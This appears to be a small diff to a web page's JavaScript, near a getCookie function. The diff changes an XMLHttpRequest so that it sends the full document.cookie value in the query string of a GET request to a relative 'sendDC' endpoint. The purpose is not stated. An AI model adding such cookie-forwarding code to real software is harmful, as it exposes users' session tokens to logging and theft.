@@ -85,6 +85,7 @@ function getCookie(sName) {
   
     xhr.onreadystatechange  = function() 
     {
+    	
        if(xhr.readyState  == 4)
        {
         if(xhr.status  == 200) 
@@ -93,7 +94,6 @@ function getCookie(sName) {
             document.ajax.dyn="Error code " + xhr.status;
         }
     };
-
    //xhr.open( "GET", "/sendDC?cookies="+document.cookie,  true);
-    xhr.open( "GET", "/sendDC",  true);
+    xhr.open( "GET", "../../sendDC?cookies="+document.cookie,  true);
    xhr.send(null);
